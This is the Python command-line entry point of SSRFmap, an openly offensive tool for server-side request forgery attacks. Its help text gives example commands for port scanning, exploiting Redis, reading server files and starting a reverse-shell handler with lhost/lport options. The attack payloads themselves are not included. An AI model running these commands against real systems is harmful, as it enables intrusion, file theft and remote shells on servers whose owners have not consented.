#!/usr/bin/python
from ssrfmap.core.ssrf import SSRF
import argparse
import logging
import urllib3


def display_banner():
    print(" _____ _________________                     ")
    print("/  ___/  ___| ___ \  ___|                    ")
    print("\ `--.\ `--.| |_/ / |_ _ __ ___   __ _ _ __  ")
    print(" `--. \`--. \    /|  _| '_ ` _ \ / _` | '_ \ ")
    print("/\__/ /\__/ / |\ \| | | | | | | | (_| | |_) |")
    print("\____/\____/\_| \_\_| |_| |_| |_|\__,_| .__/ ")
    print("                                      | |    ")
    print("                                      |_|    ")

def parse_args():
    example_text = '''Examples:
    ssrfmap -r data/request2.txt -p url -m portscan
    ssrfmap -r data/request.txt -p url -m redis
    ssrfmap -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
    ssrfmap -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
    ssrfmap -r data/request.txt -p url -m readfiles --rfiles
    '''
    parser = argparse.ArgumentParser(epilog=example_text, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-r', action ='store', dest='reqfile', help="SSRF Request file")
    parser.add_argument('-p', action ='store', dest='param',   help="SSRF Parameter to target")
    parser.add_argument('-m', action ='store', dest='modules', help="SSRF Modules to enable")
    parser.add_argument('-l', action ='store', dest='handler', help="Start an handler for a reverse shell", nargs='?', const='1')
    parser.add_argument('-v', action ='store', dest='verbose', help="Enable verbosity", nargs='?', const=True)
    parser.add_argument('--lhost', action ='store', dest='lhost',     help="LHOST reverse shell")
    parser.add_argument('--lport', action ='store', dest='lport',     help="LPORT reverse shell")
    parser.add_argument('--rfiles', action ='store', dest='targetfiles', help="Files to read with readfiles module", nargs='?', const=True)
    parser.add_argument('--uagent',action ='store', dest='useragent', help="User Agent to use")
    parser.add_argument('--ssl',   action ='store', dest='ssl',       help="Use HTTPS without verification", nargs='?', const=True)
    parser.add_argument('--level', action ='store', dest='level',     help="Level of test to perform (1-5, default: 1)", nargs='?', const=1, default=1, type=int)
    results = parser.parse_args()

    if results.reqfile == None:
        parser.print_help()
        exit()

    return results

def ssrfmap():
    # disable ssl warning for self signed certificate
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # enable custom logging
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s]:%(message)s')
    logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
    logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
    display_banner()

    # SSRFmap
    args = parse_args()
    ssrf = SSRF(args)
